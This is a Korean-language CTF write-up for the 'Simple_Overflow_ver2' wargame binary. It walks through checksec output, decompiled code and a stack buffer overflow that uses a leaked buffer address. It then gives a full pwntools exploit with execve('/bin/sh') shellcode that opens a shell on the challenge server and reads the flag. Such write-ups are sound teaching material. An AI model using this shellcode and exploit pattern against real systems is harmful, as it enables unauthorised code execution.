# Simple_Overflow_ver2

```c
kimdong@ubuntu  ~/Wargame  file Simple_overflow_ver_2
Simple_overflow_ver_2: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=8225d06464b48b5f4859fb16d8458cf33768f5de, not stripped

kimdong@ubuntu  ~/Wargame  checksec Simple_overflow_ver_2
[*] '/home/kimdong/Wargame/Simple_overflow_ver_2'
   Arch:     i386-32-little
   RELRO:    Partial RELRO
   Stack:    No canary found
   NX:       NX disabled
   PIE:      No PIE (0x8048000)
   RWX:      Has RWX segments
```
다음 바이너리 파일은 32bit로 `Partial RELRO`외에는 다른 메모리 보호기법이 없다.<br>

```c
kimdong@ubuntu  ~/Wargame  ./Simple_overflow_ver_2
Data : aaaaaaaaaa
0xffc1b890:  a a a a a a a a a a
Again (y/n): y
Data : aaaaaaaa
0xffc1b890:  a a a a a a a a
Again (y/n): n

kimdong@ubuntu  ~/Wargame  ./Simple_overflow_ver_2
Data : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0xfffdfd50:  a a a a a a a a a a a a a a a a
0xfffdfd60:  a a a a a a a a a a a a a a
Again (y/n): n
```
실행시켜보면 `Data : `란 문자열이 출력되면서 사용자의 입력값을 받는다.<br>
입력을 하고 나면, buffer의 주소값과 함께 입력한 값을 출력한다.<br>
16byte가 넘더가게 되면, 다음줄의 주소값이 나타나게 되고, 끄고 다시 실행시키면 매번 주소값이 달라진다.<br>
하지만, y를 선택하고 다시 입력하는 경우에는 주소값이 변하지 않는다.<br>
따라서, 첫번째에 아무 값이나 입력하고 buffer의 주소값을 받아온뒤에 bof취약점을 사용하면 가능할것으로 보인다.<br>

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  size_t v3; // ebx
  char v5; // [esp+13h] [ebp-89h]
  char s[128]; // [esp+14h] [ebp-88h]
  int i; // [esp+94h] [ebp-8h]

  setvbuf(stdout, 0, 2, 0);
  v5 = 121;
  do
  {
    printf("Data : ");
    if ( __isoc99_scanf(" %[^\n]s", s) )
    {
      for ( i = 0; ; ++i )
      {
        v3 = i;
        if ( v3 >= strlen(s) )
          break;
        if ( !(i & 0xF) )
          printf("%p: ", &s[i]);
        printf(" %c", (unsigned __int8)s[i]);
        if ( i % 16 == 15 )
          putchar(10);
      }
    }
    printf("\nAgain (y/n): ");
  }
  while ( __isoc99_scanf(" %c", &v5) && (v5 == 121 || v5 == 89) );
  return 0;
}
```
ida로 분석한 main문은 다음과 같다.<br>
변수 s buffer의 시작주소는 `ebp-0x88`이다.<br>
따라서, buffer의 shellcode를 채워준 다음에, ret주소를 버퍼의 주소로 해주면 문제가 해결가능할것이다.<br>
dummy값은 `0x88 + 4(SFP) - 25(shellcode)`로 채워주면 된다.<br>

---

## Exploit Code

```c
from pwn import *
p = remote("ctf.j0n9hyun.xyz", 3006)

p.recvuntil("Data : ")
payload1 = "A"*4
p.sendline(payload1)
buf_addr = int(p.recv(10),16)

p.recvuntil("Again (y/n): ")
p.sendline("y")
p.recvuntil("Data : ")
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
payload2 = shellcode
payload2 += "a"*(0x88+4-25)
payload2 +=p32(buf_addr)
p.sendline(payload2)
p.interactive()
```

```c
kimdong@ubuntu  ~/Wargame  python ex_overflow_ver2.py
[+] Opening connection to ctf.j0n9hyun.xyz on port 3006: Done
[*] Switching to interactive mode
0xffb306f0:  1 󿾠P h / / s h h / b i n \x89 ័
0xffb30700:  S \x89 󿠉  \xb0 \x0bˠ\x80 a a a a a a a
0xffb30710:  a a a a a a a a a a a a a a a a
0xffb30720:  a a a a a a a a a a a a a a a a
0xffb30730:  a a a a a a a a a a a a a a a a
0xffb30740:  a a a a a a a a a a a a a a a a
0xffb30750:  a a a a a a a a a a a a a a a a
0xffb30760:  a a a a a a a a a a a a a a a a
0xffb30770:  \x80
Again (y/n): $ ls
$ ls
flag
main
$ cat flag
HackCTF{}
```

## END !
